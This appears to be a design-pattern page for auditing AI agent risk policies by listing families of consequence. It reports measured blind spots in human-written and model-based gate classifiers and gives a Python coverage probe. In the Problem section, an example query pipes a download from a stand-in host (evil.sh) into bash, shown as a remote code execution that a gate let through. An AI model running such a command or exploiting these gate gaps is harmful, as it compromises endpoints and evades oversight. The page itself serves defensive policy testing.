---
title: Consequence-Family Coverage Audit
status: emerging
authors: ["Tulip Labs (@fede-kamel)"]
based_on: ["Tulip Labs (Policy blindness, 2026)"]
category: "Security & Safety"
source: "https://tulipagents.ai/research/policy-blindness/"
tags: [risk-classification, policy-authoring, coverage-testing, admission-control, blind-spots]
summary: "Audit an agent's risk policy by enumerating families of consequence and asking which rule covers each, because a hand-written risk list reliably encodes one family and stays silent on the rest"
maturity: "early"
complexity: "low"
effort: low
impact: "high"
signals: ["Agent has tools that can spend money, run code, move data, or message real people", "Risk rules are a keyword list or a set of tool names", "The policy was validated against the tool catalog and passed"]
anti_signals: ["Agent is read-only", "Every tool call already requires human approval"]
prerequisites: ["An enumerable tool catalog", "A risk classifier or policy to audit"]
related: ["policy-gated-tool-proxy", "human-in-loop-approval-framework", "sandboxed-tool-authorization"]
tools: ["policy-engines", "tool-registries"]
domains: ["ops", "security", "fintech"]
updated_at: "2026-08-13"
---

## Problem

An agent gate has two halves. There is an **enforcement point** that decides
allow / hold / deny and refuses to run anything else — see
[policy-gated-tool-proxy](policy-gated-tool-proxy.md) — and there is a
**classifier** that decides what kind of thing is being proposed. The
enforcement point is deterministic, small, and exhaustively testable. Everyone
reviews it, because it looks like security.

The classifier is usually a list of strings, and that list has a failure mode
that survives review: **it describes one family of consequence and says nothing
about the others.**

The failure is not carelessness. Every entry on the list is correct. The list
is simply written from inside one idea of harm — and from inside that frame,
the missing families are invisible.

Three real gates, each reviewed, tested, and validated against the live tool
catalog:

| gate over | the list covered | it was silent on |
|---|---|---|
| a payments API | money **out** — refund, cancel, dispute, delete | money **in** — creating a charge, standing up a payment page |
| a DFIR/EDR query tool | **destruction** — quarantine, kill, wipe, uninstall | **execution and exfiltration** |
| a billing API | **money movement** | **outbound communication** |

The second is the instructive one. Fourteen markers, all destruction verbs. A
gate that correctly held `Windows.Remediation.Quarantine` let this through as a
benign read:

```sql
SELECT * FROM execve(argv=["bash","-c","curl http://evil.sh | bash"])
```

Nobody decided arbitrary code execution on a fleet endpoint was acceptable.
Running a command destroys nothing, so no destruction verb matched.

**Validating against the real tool catalog does not catch this.** You score the
catalog against a ground truth you also wrote, from the same mental model that
produced the list. The labels agree with the classifier because both encode the
same idea of harm. One of the gates above scored 62/62 on a catalog pulled live
from the real API, twice, across six rounds of hardening — while "create a
charge" was classified low-risk the entire time.

## Solution

Do not re-read the list. Re-reading a list confirms the list; it cannot reveal
the family that was never on it.

Instead, **enumerate the ways an action can be consequential, and ask of each:
which rule covers this?** An empty answer is the finding.

| family | the action… | example that gets missed |
|---|---|---|
| Destruction | removes or overwrites something | `purge_backups` |
| Value out | moves money or assets away | `create_payout` |
| Value in | takes payment, or stands up a surface that can | `create_payment_link` |
| Execution | runs caller-supplied code | `execve(argv=…)` |
| Egress | moves data off a system | `export_customers` |
| Outbound communication | reaches a real third party | `send_invoice_reminder` |
| Standing commitment | schedules future automatic behaviour | `setup_auto_reminders` |
| Identity & access | changes who can do what | `create_service_token` |
| Config with blast radius | changes behaviour for everyone | `update_dns_record` |

The table is a prompt for thought, not a schema — add rows for your domain. The
point is having *some* enumeration to check against, so that a whole family
cannot go missing in silence.

Three questions per family:

1. **Which rule covers it?** No rule means the family is unhandled.
2. **Is there a second path to the same outcome?** Holding "send the invoice"
   while leaving "generate a scannable payment code for that invoice" open
   holds nothing. An unheld alternative route is worth more to an attacker than
   the route you held.
3. **Does the caller control the dangerous part?** A tool that shells out
   internally to read disk usage is a read. A tool that runs a command the
   caller supplies is not, however similar the names look.

## Evidence

The pattern was derived from three hand-written gates, and then tested against
a model trained specifically to classify admission decisions — on the theory
that if the blindness were only an artifact of human authorship, a trained
model would not reproduce it.

It reproduced. On 8,989 held-out rows the classifier had a **0.74% false-allow
rate overall**, but the errors were not spread evenly:

| family | risky rows | let through |
|---|---|---|
| execution | 165 | **5.45%** |
| egress | 94 | **5.32%** |
| standing commitment | 110 | 1.82% |
| destruction, value-in, outbound | 1,761 | **0.00%** |

Two families carried roughly ten times the error rate of the rest, in a model
whose largest training source — 17,713 of 38,419 rows — was built explicitly to
fight this failure.

Seven models were then run on identical rows, including GPT-5 and Claude Opus 5.
Where the policy states its own rule, every frontier model reached **0.00%
false-allow**; they are safe on explicit policy and merely over-cautious. The
useful reading is that explicitness in the policy is doing the work, which is
the same claim this pattern makes from the other direction.

## How to use it

Run the enumeration as a test, not as a one-off review. A family that is
genuinely out of scope belongs in an explicit allowlist with a reason beside
it.

```python
# One representative action per family. Nothing here is exhaustive on purpose:
# the value is that adding a family is cheap, so a missing one is a choice.
FAMILY_PROBES = {
    "destruction":         "delete_record",
    "value_out":           "issue_refund",
    "value_in":            "create_charge",
    "execution":           "run_script",
    "egress":              "export_customers",
    "outbound_comms":      "send_invoice",
    "standing_commitment": "enable_auto_reminders",
    "identity_access":     "disable_user",
}

def uncovered(classify, benign_probe):
    """Families whose representative action would be auto-allowed.

    `benign_probe` is a call that *should* sail through. It is not optional:
    a policy that holds everything reports no gaps while telling you nothing,
    which is the exact false all-clear this pattern is about.
    """
    if is_held(classify(benign_probe)):
        raise AssertionError(
            f"{benign_probe!r} was held, so this policy holds everything and "
            "the probe cannot distinguish a covered family from an uncovered one."
        )
    return [fam for fam, action in FAMILY_PROBES.items()
            if not is_held(classify(action))]
```

Against a classifier matching reversal verbs only — the first failure in the
table above — this returns six of the eight families.

## Trade-offs

- **Judge a gate by what it lets through, not by what it stops.** Over-caution
  costs a confirmation prompt; a miss costs the thing you built the gate for.
  Where a marker cannot be tightened without opening a real path, leave it
  broad and write the resulting false positives down.
- **The enumeration is itself a list**, and inherits the same weakness one
  level up. It is more robust only because families are coarser and fewer than
  tool names, so an omission is more visible.
- **Over-holding is a real cost.** A gate that is perfectly safe and stops
  everything gets switched off within a day, so measure over-hold rate
  alongside false-allow rate.
- This does not replace enforcement. It audits the input to enforcement.

## References

- [The family of harm your agent policy cannot see](https://tulipagents.ai/research/policy-blindness/)
  — the three gates, the measured instance, and the seven-model comparison
- [Writing a policy that holds](https://tulipagents.ai/concepts/policy-authoring/)
  — the method with a runnable coverage probe
- Datasets and eval scripts:
  [tuliplabs-ai/sdk-python/examples/research](https://github.com/tuliplabs-ai/sdk-python/tree/main/examples/research)
